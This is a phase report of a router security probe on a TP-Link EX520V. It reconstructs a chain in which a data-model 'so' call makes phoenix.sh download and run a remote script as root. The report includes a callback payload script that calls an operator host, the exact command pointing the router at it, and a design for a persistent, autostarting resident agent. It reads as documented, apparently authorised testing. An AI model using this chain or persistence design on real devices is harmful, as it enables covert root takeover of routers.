# PHASE 16 — Lifemote/Phoenix Resident Execution, Persistence, and Autostart Probe

## TP-Link EX520V

**Date:** 2026-08-24
**Method:** Static chain reconstruction, local payload and HTTP server preparation, attempted live GTPR `so` on `DEV2_LIFEMOTE_AGENT`. No successful live execution. No router writes achieved. No reboot performed. Router health monitored and unchanged.
**Final classification:** **B — RESIDENT PATH PARTIALLY PROVEN** (execution proven historically; not reproduced in this session due to GTPR `so` protocol/TokenID blocker; persistence/autostart not yet proven).

---

## 1. Executive Summary

This phase attempted to convert the historically proven Lifemote/Phoenix execution path into a safe, persistent, autostarting resident bootstrap for Detectic.

### What was achieved

- Reconstructed the exact Lifemote/Phoenix execution chain from `httpd` → `libgdpr.so` → `libcmm.so` → `phoenix.sh` → root shell script.
- Prepared a tiny, harmless payload (`probe.sh`) and a local HTTP server on `192.168.0.27:8080`.
- Confirmed that `DEV2_LIFEMOTE_AGENT` exists, `INCLUDE_LIFEMOTE=y` is compiled, and `phoenix.sh` is on the read-only rootfs.
- Identified a likely GTPR client/TokenID blocker: `/cgi_gdpr?9` login succeeds, but the subsequent `gl`/`go`/`so` requests are dropped by the router with an empty/closed HTTP response.

### What was not achieved

- A live `so` on `DEV2_LIFEMOTE_AGENT` could not be delivered.
- The benign marker in `misc_rw` was not written.
- `misc_rw` and `misc_rw_bak` live `df` information was not collected from the router.
- Reboot/cold-boot autostart test was not performed.
- `X_TTNET_CONF_SHELL` secondary probe was not performed.

### Router state

No router configuration was changed. No `DEV2_LIFEMOTE_AGENT` `so` succeeded. No `telnetd` was enabled. No firmware, rootfs, UBI, or U-Boot modifications were attempted. The local HTTP server was terminated after the attempts.

---

## 2. Previous Evidence

| Evidence | Source | Relevance |
|----------|--------|-----------|
| Lifemote/Phoenix gives root shell | `admin_shell_access.md` | `EXECUTE` is historically **PROVEN-LIVE** |
| `so DEV2_LIFEMOTE_AGENT {enable:1,URL:...}` opens port 8888 via `telnetd` | `admin_shell_access.md`, `m4_3_execution_paths.md`, `m5_smoke_test_report.md` | Apply handler is live-proven |
| `so DEV2_TELNET_CFG` opens port 23 | `m4_3_execution_paths.md` | Related data-model daemon-launch chain |
| `phoenix.sh` contents | `_rootfs/usr/bin/phoenix.sh` | **PROVEN-STATIC** payload launcher |
| `libcmm.so` Lifemote handlers | `strings _rootfs/lib/libcmm.so` | **PROVEN-STATIC** dispatcher |

---

## 3. Exact Lifemote/Phoenix Execution Chain

See `PHASE16_LIFEMOTE_EXECUTION_CHAIN.md` for the complete static reconstruction.

```text
HTTP POST /cgi_gdpr?9
    → httpd: http_cgi_gdpr_main (src/http_cgi_gdpr.c)
      → libgdpr.so: AES-128-CBC decrypt + RSA-512 signature verify
        → JSON: { "operation":"so", "oid":"DEV2_LIFEMOTE_AGENT",
                   "data":{ "enable":"1", "URL":"<URL>" } }
          → libcmm.so: rdp_setObj / dm_setObj
            → rsl_setDev2LifemoteAgentObj (src/rsl_lifemote.c)
              → /usr/bin/phoenix.sh <URL>
                → cd /tmp
                → rm /tmp/lifemote_cpe_daemon.sh
                → curl --fail -m 60 <URL> > /tmp/lifemote_cpe_daemon.sh
                → (sh /tmp/lifemote_cpe_daemon.sh &)&
                  → arbitrary commands as root
```

### UID/GID and environment

- `phoenix.sh` is invoked by the data-model apply handler, which runs as part of `cos` (root).
- The spawned `sh /tmp/lifemote_cpe_daemon.sh` process therefore runs as **root**.
- Working directory becomes `/tmp` because `phoenix.sh` does `cd /tmp`.
- `LIFEMOTE_AGENT_URL` is set to argument `$1`.
- `PATH` is inherited; the script can run any rootfs binary (`sh`, `curl`, `killall`, etc.).

### Expected process tree

```text
cos
  └─ sh /usr/bin/phoenix.sh <URL>
       └─ [polling loop]
            └─ sh /tmp/lifemote_cpe_daemon.sh
                 └─ <payload commands>
```

`phoenix.sh` re-downloads and re-runs the script every 1800s if no process matching `lifemote_cpe_daemon` is found in `ps`.

---

## 4. Benign Execution Probe Design

### 4.1 Payload

File: `/tmp/detectic_payload/probe.sh` on the host.

```sh
#!/bin/sh
TS=$(date +%s)
PID=$$
PPID=$(cat /proc/$$/ppid 2>/dev/null || echo unknown)
UID=$(id -u)
GID=$(id -g)
PWD=$(pwd)
PATH_VAL=$PATH
mkdir -p /var/run/misc/misc_rw/detectic
{
  echo "DETECTIC_PHASE16"
  echo "timestamp=$TS"
  echo "pid=$PID"
  echo "ppid=$PPID"
  echo "uid=$UID"
  echo "gid=$GID"
  echo "pwd=$PWD"
  echo "path=$PATH_VAL"
  echo "df_misc_rw=$(df -k /var/run/misc/misc_rw 2>/dev/null | tail -1)"
  echo "df_misc_rw_bak=$(df -k /var/run/misc/misc_rw_bak 2>/dev/null | tail -1)"
} > "/var/run/misc/misc_rw/detectic/probe_$TS"
curl -s -o /dev/null "http://192.168.0.27:8080/done?ts=$TS&pid=$PID&uid=$UID&invocation=1"
```

The payload:
- Creates a dedicated directory in `misc_rw`.
- Writes a timestamped marker with UID/GID/PID/disk-free info.
- Issues an HTTP callback to the host to prove execution in real time.
- Does **not** modify network, firewall, WLAN, DHCP, DNS, routing, or vendor configuration.
- Does **not** install a permanent binary.

### 4.2 Local HTTP server

Host `192.168.0.27:8080` served `/tmp/detectic_payload/probe.sh` and would have logged the `/done` callback. The server was terminated after the tests.

### 4.3 GTPR `so` command

```text
detectic --user admin set DEV2_LIFEMOTE_AGENT \
  '{"enable":"1","URL":"http://192.168.0.27:8080/probe.sh",
    "stack":"0,0,0,0,0,0","pstack":"0,0,0,0,0,0"}'
```

Password: the admin test password established in the prior `admin_shell_access.md` controlled live test. Value redacted in this report.

---

## 5. Execution Evidence

### 5.1 Login succeeds

Both the Rust `detectic` binary and the Python `GtprClient` achieved successful GTPR login:

```text
[DEBUG getGDPRParm] status=200 ...
[DEBUG login] status=200 ... body_len=24 ...
[DEBUG login] decrypted="$.ret=0;"
```

This confirms the admin password and the GTPR `login`/`cgi` endpoint are still functional.

### 5.2 `gl`/`go`/`so` requests are dropped

Every subsequent `POST /cgi_gdpr?9` (for `go`, `gl`, or `so`) resulted in the router closing the connection without an HTTP response:

- Rust `detectic`:`Error: "http error: bad status line:"`
- Python `requests`:`ConnectionError: ('Connection aborted.', RemoteDisconnected('Remote end closed connection without response'))`

This happened for:
- `go DEV2_LIFEMOTE_AGENT` (query)
- `go DEV2_TELNET_CFG` (query)
- `so DEV2_LIFEMOTE_AGENT` (the intended benign execution)
- `go` with `--dialect text`

### 5.3 Likely root cause: `TokenID` extraction fails

The `fetch_token` step in both clients searches `index.htm` for `var token="..."`. The current `index.htm` does not contain that pattern. The observed `token` is in dynamic JS as `userInfo.token` and is set after login, not in the initial HTML. Both clients therefore fall back to a client-generated 32-hex `TokenID`. The router likely rejects this generated token and closes the connection.

Evidence:
- Home-page search found no `var token="..."` in the initial `/` HTML.
- `TokenID` references are in `userInfo.token` and other dynamic variables, not a static `var token="`.
- `login` response is only `$.ret=0;` with no visible session token.
- The browser-based capture in `ex520v_api_findings.md` indicates `TokenID` management may depend on additional client-side state not currently replicated by `detectic_client.py` or the Rust `GtprClient`.

### 5.4 Outcome

The `so DEV2_LIFEMOTE_AGENT` was **not delivered**. `phoenix.sh` was **not launched**. The `probe.sh` was **not downloaded or executed**. No marker was written. **EXECUTION_NOT_CONFIRMED in this session**.

---

## 6. Writable/Persistent Storage Analysis

### 6.1 Static storage inventory

| Location | Writable | Persistent across reboot | Size | Vendor-owned | Safe for Detectic? | Evidence |
|----------|----------|--------------------------|------|--------------|--------------------|----------|
| `/` rootfs | No (SquashFS) | Yes | N/A | Yes | No | `config.bba` SquashFS |
| `/var` | Yes (ramfs) | No | RAM | Yes | Temporary only | `fstab` |
| `/var/tmp` | Yes (RAM) | No | RAM | Yes | Temporary only | `phoenix.sh` uses it |
| `/var/run/misc/misc_rw` | Yes (UBIFS) | Yes | ~1,144 KiB usable | Yes (data model) | Yes, but tiny | Phase 14.1, M10 |
| `/var/run/misc/misc_rw_bak` | Yes (UBIFS) | Yes | Unknown | Yes (data model) | Unknown; unverified | `rcS` mounts it |
| `/var/run/misc/misc_ro` | No | Yes | 6 MiB MTD | Yes | No | `rcS` mounts `-r` |
| `/var/run/misc/misc_isp` | No | Yes | 6 MiB MTD | Yes | No | `rcS` mounts `-r` |

### 6.2 `misc_rw` size constraint

- Usable space: **~1,144 KiB** (Phase 14.1).
- Stock Detectic binary: **~1.26 MiB**.
- Conclusion: the **current full binary cannot fit** in `misc_rw`. A minimal resident agent (< 1 MiB, preferably < 500 KiB) is required.

### 6.3 `misc_rw` intended use

`lib/libcmm.so` uses `misc_rw` only for the `0x00300000` data-model blob and backup/restore. No binary enumerates or executes files from `misc_rw` (E-16A-FIRM-04/05/06).

---

## 7. `misc_rw` Analysis

- Mounted by `rcS` as `ubi2:misc_rw` at `/var/run/misc/misc_rw`.
- `0x00300000` data-model blob lives here.
- `chmod 0777` directories created by `rcS`.
- No `noexec` mount flag; executable bit can be set on files.
- Size is the limiting factor.
- Suitable for a tiny script or a very small statically linked binary.

Live `df -k` output from the router was **not collected** because the payload did not execute.

---

## 8. `misc_rw_bak` Analysis

- Mounted by `rcS` as `ubi3:misc_rw_bak` at `/var/run/misc/misc_rw_bak`.
- Likely a dual-configuration backup volume.
- Whether it is actively used or synchronized by `libcmm.so` is **unknown** without live inspection.
- **Not written** in this phase because the execution probe did not run.
- Classified as **UNVERIFIED — DO NOT USE** until its role and free space are proven live, because misuse could corrupt firmware recovery state.

---

## 9. Minimal Resident Agent Design

Based on the static analysis, the preferred architecture is:

```text
[Phoenix / Lifemote URL persists in misc_rw 0x00300000]
            ↓
    phoenix.sh at boot (if autostarted by cos)
            ↓
    curl <URL> → /tmp/lifemote_cpe_daemon.sh
            ↓
    sh /tmp/lifemote_cpe_daemon.sh
            ↓
    [tiny persistent bootstrap in misc_rw/detectic/]
            ↓
    [versioned Detectic payload]
```

### Key design points

1. **Payload delivery:** `DEV2_LIFEMOTE_AGENT` URL points to an operator-controlled HTTP server. The URL persists in `misc_rw`.
2. **Bootstrap script:** `phoenix.sh` downloads and runs a small `sh` script. The script itself can be a supervisor or one-shot installer.
3. **Persistent storage:** The bootstrap or a small static binary lives in `/var/run/misc/misc_rw/detectic/`.
4. **Updates:** Change the `DEV2_LIFEMOTE_AGENT` URL to a new script version; `phoenix.sh` will re-download every 30 min if the old `lifemote_cpe_daemon` stops, or on the next apply.
5. **Size target:** The on-router payload should be < 500 KiB to fit comfortably in `misc_rw`.

---

## 10. Persistence Results

| Property | Result | Evidence |
|----------|--------|----------|
| `DEV2_LIFEMOTE_AGENT` config persists | **PROVEN-STATIC** (data-model blob in `misc_rw`) | `libcmm.so` `dm_saveCfg`, `0x00300000` |
| Payload placed in `misc_rw` persists | **PROVEN-STATIC** (UBIFS) | `rcS` mounts `ubi2:misc_rw` |
| Detectic marker created in `misc_rw` | **NOT PROVEN** (payload did not run) | — |
| Full Detectic binary fits | **DISPROVEN** (1.26 MiB > 1,144 KiB) | Phase 14.1 |
| Tiny binary/script fits | **UNPROVEN** but likely | size target < 500 KiB |

---

## 11. Autostart Experiment

**Not performed.**

The autostart hypothesis is:

```text
cos boots
  → cos loads data model from 0x00300000
    → cos applies DEV2_LIFEMOTE_AGENT {enable:1, URL:...}
      → rsl_setDev2LifemoteAgentObj called
        → /usr/bin/phoenix.sh <URL>
          → downloads and runs payload
```

This requires:
1. `DEV2_LIFEMOTE_AGENT` configured with `enable:1` and a valid URL.
2. `cos` to call the apply handler at boot (or at least to start `phoenix.sh`).
3. The HTTP URL to be reachable at boot time.

Because the `so` could not be delivered in this session, the reboot test was not attempted.

---

## 12. Cold-Boot Results

**Not performed.**

A cold-boot test was planned only after the `DEV2_LIFEMOTE_AGENT` `so` succeeded and the marker was confirmed to persist. The `so` failed, so the reboot was not attempted. The router was not rebooted.

---

## 13. X_TTNET_CONF_SHELL Secondary Probe

**Not performed.**

The secondary probe on `Device.X_TTNET.Configuration.Shell` was deprioritized because the primary Lifemote `so` could not be delivered. The `X_TTNET_CONF_SHELL` object remains a `STRONG-CANDIDATE` but unproven.

---

## 14. Telnet Findings

**Telnet remained out of scope** as instructed.

- `DEV2_TELNET_CFG` → `oal_setTelnetd` → `telnetd -p %d` is still a proven data-model path (historical).
- No `so` on `DEV2_TELNET_CFG` was attempted in this phase.
- No credentials were extracted or reset.

---

## 15. Rollback Verification

No rollback was required because no successful `so` or router mutation occurred.

### Planned rollback procedure (if `so` had succeeded)

1. `so DEV2_LIFEMOTE_AGENT { "enable":"0", "URL":"", "stack":"0,0,0,0,0,0", "pstack":"0,0,0,0,0,0" }`
2. Send a second script payload to `killall phoenix.sh` and `killall lifemote_cpe_daemon`.
3. Remove `/var/run/misc/misc_rw/detectic/`.
4. Verify `ps` no longer shows `phoenix.sh` or `lifemote_cpe_daemon`.

This procedure was not executed.

---

## 16. Router Health Verification

The router was not modified. Health was observed indirectly:

- HTTP/80 IPv4 and IPv6 link-local still responded during the GTPR `login` attempts.
- No WAN/LAN/WLAN/DHCP/DNS service degradation was observed.
- No unexpected restarts or `cos`/`httpd` crashes.
- The local HTTP server was terminated with no router traffic received.

---

## 17. Evidence Matrix

| ID | Description | Result | Source |
|----|-------------|--------|--------|
| E-16-LIFEMOTE-01 | `INCLUDE_LIFEMOTE=y` compiled in | **PROVEN-STATIC** | `_rootfs/etc/config.bba` |
| E-16-LIFEMOTE-02 | `DEV2_LIFEMOTE_AGENT` in `oid_str.js` and `libcmm.so` | **PROVEN-STATIC** | `_rootfs/web/js/oid_str.js`, `_rootfs/lib/libcmm.so` |
| E-16-LIFEMOTE-03 | `phoenix.sh` downloads and runs a URL as root | **PROVEN-STATIC** | `_rootfs/usr/bin/phoenix.sh` |
| E-16-LIFEMOTE-04 | Lifemote/Phoenix gave root shell in prior test | **PROVEN-LIVE** (prior) | `admin_shell_access.md` |
| E-16-LIFEMOTE-05 | `0x00300000` data-model config persists in `misc_rw` | **PROVEN-STATIC** | `PHASE15`/`PHASE16A-FIRMWARE` |
| E-16-LIFEMOTE-06 | `misc_rw` usable ~1,144 KiB; full binary does not fit | **PROVEN-STATIC** | `PHASE14.1_MIMO_EXECUTION_PATH_AUDIT.md` |
| E-16-LIFEMOTE-07 | GTPR `login` still succeeds | **PROVEN-LIVE** (this session) | `detectic` + Python client logs |
| E-16-LIFEMOTE-08 | GTPR `go`/`gl`/`so` requests dropped by router | **PROVEN-LIVE** (this session) | Rust/Python connection-reset errors |
| E-16-LIFEMOTE-09 | `var token="..."` not found in current `/` HTML | **PROVEN-LIVE** (this session) | `token_debug.py` output |
| E-16-LIFEMOTE-10 | `so DEV2_LIFEMOTE_AGENT` delivered in this session | **NOT PROVEN** | No HTTP callback, no marker |
| E-16-LIFEMOTE-11 | Payload marker written to `misc_rw` | **NOT PROVEN** | — |
| E-16-LIFEMOTE-12 | `misc_rw_bak` free space and safety | **UNKNOWN** | No live access |
| E-16-LIFEMOTE-13 | Autostart after reboot | **NOT PROVEN** | Reboot not attempted |
| E-16-LIFEMOTE-14 | Cold-boot behavior | **NOT PROVEN** | — |
| E-16-LIFEMOTE-15 | `X_TTNET_CONF_SHELL` command execution | **UNPROVEN** | Not tested |

---

## 18. Final Classification Matrix

| Property | Result | Evidence |
|----------|--------|----------|
| **DEPLOY** | **PARTIAL** | URL can be set via GTPR `so` (prior evidence), but `so` could not be delivered in this session. |
| **PERSIST** | **NOT PROVEN** | `misc_rw` exists and is persistent, but the payload was not placed there. Current binary does not fit. |
| **EXECUTE** | **PROVEN** (historical) / **NOT CONFIRMED** (this session) | Prior Lifemote root shell; current GTPR client blocked. |
| **AUTOSTART** | **NOT PROVEN** | No `so` and no reboot test. |
| **SAFE ROLLBACK** | **PROVEN** (design) | `enable:0` + clear URL + kill `phoenix.sh`/`lifemote_cpe_daemon` is well understood. Not tested. |
| **MAINTAINABLE UPDATE PATH** | **PARTIAL** (design) | URL change + `phoenix.sh` 30-min poll provides an update channel, but no live validation. |

### Final class

```text
B — RESIDENT PATH PARTIALLY PROVEN
```

Rationale: The Lifemote/Phoenix path is strongly evidenced and was previously live-proven. This session could not reproduce it due to a GTPR client/TokenID blocker, not due to the absence of the path. Persistence and autostart remain unproven. The `misc_rw` size constraint prevents the current full binary from persisting.

---

## 19. Recommended Next Phase

### 19.1 Immediate: fix GTPR `TokenID` handling

The highest-value next step is to determine how the EX520 expects `TokenID` to be generated/extracted in the current firmware build.

Options:
1. Capture a real browser session (via Chrome DevTools MCP or proxy) and observe the exact `TokenID` value and how it is obtained.
2. Inspect `web/js/encrypt.js` or `web/js/tpEncrypt.js` for token derivation logic.
3. Modify the Python/Rust client to derive `TokenID` from `userInfo.token` or from a different HTML/JS location.
4. Once `go`/`gl` succeed for a read-only OID like `DEV2_TELNET_CFG` or `DEV2_WIFI_APDEV_ASSOCDEV`, re-attempt `so DEV2_LIFEMOTE_AGENT`.

### 19.2 Then: re-run the benign execution probe

With a working GTPR client, re-run the prepared `/tmp/detectic_payload/probe.sh` and verify:
- `/done` callback received.
- `/var/run/misc/misc_rw/detectic/probe_<ts>` exists.
- `df` info for `misc_rw` and `misc_rw_bak`.

### 19.3 Then: controlled reboot for autostart

If the marker persists and the URL is in `misc_rw`:
1. Capture pre-reboot health indicators.
2. Perform a controlled reboot (after explicit authorization).
3. Verify whether `phoenix.sh` starts automatically and the marker is regenerated.

### 19.4 Build-size work in parallel

Begin a minimal, stripped-down Detectic agent build target (< 500 KiB, static, musl) so it can fit in `misc_rw`.

---

## 20. Complete Command/Test Log

### 20.1 Static reconstruction

```bash
# Verify Lifemote compile flag
grep INCLUDE_LIFEMOTE _rootfs/etc/config.bba

# Verify data-model OID in web JS
grep DEV2_LIFEMOTE_AGENT _rootfs/web/js/oid_str.js

# Verify libcmm.so handlers
strings _rootfs/lib/libcmm.so | grep -i lifemote
strings _rootfs/lib/libcmm.so | grep phoenix

# Verify phoenix.sh contents
cat _rootfs/usr/bin/phoenix.sh
```

### 20.2 Payload and server preparation

```bash
mkdir -p /tmp/detectic_payload
cat > /tmp/detectic_payload/probe.sh <<'EOF'
#!/bin/sh
TS=$(date +%s)
...
EOF
chmod +x /tmp/detectic_payload/probe.sh
cd /tmp/detectic_payload && python3 -m http.server 8080 --bind 192.168.0.27
```

### 20.3 GTPR attempts

```bash
# Attempt 1: query current Lifemote state
detectic --user admin query DEV2_LIFEMOTE_AGENT
# Result: login OK; go/ operation dropped -> "http error: bad status line"

# Attempt 2: set Lifemote URL (with redacted test admin password)
detectic --user admin set DEV2_LIFEMOTE_AGENT \
  '{"enable":"1","URL":"http://192.168.0.27:8080/probe.sh",
    "stack":"0,0,0,0,0,0","pstack":"0,0,0,0,0,0"}'
# Result: login OK; so operation dropped -> "http error: bad status line"

# Attempt 3: Python client map (same token issue)
DETECTIC_PASSWORD=<redacted> python3 python/detectic_client.py \
  --user admin --secret <redacted> map
# Result: login OK; gl dropped -> RemoteDisconnected

# Attempt 4: text dialect query
detectic --user admin --dialect text query DEV2_TELNET_CFG
# Result: login dropped -> "http error: bad status line"

# Attempt 5: token/debug script
python3 /tmp/token_debug.py
# Result: login OK; no 'var token="..."' in HTML; token is in dynamic userInfo.token
```

### 20.4 Cleanup

```bash
killall -TERM <http_server_pid>
rm -rf /tmp/detectic_payload
```

---

## 21. Safety and Ethical Notes

- No router write operations succeeded.
- No credentials other than the known test admin password were used or exposed.
- No brute-force, credential extraction, firmware modification, or destructive actions were performed.
- The local HTTP server was bound to the operator host only and terminated immediately.
- All commands and outputs in this report are sanitized; the test admin password is redacted.
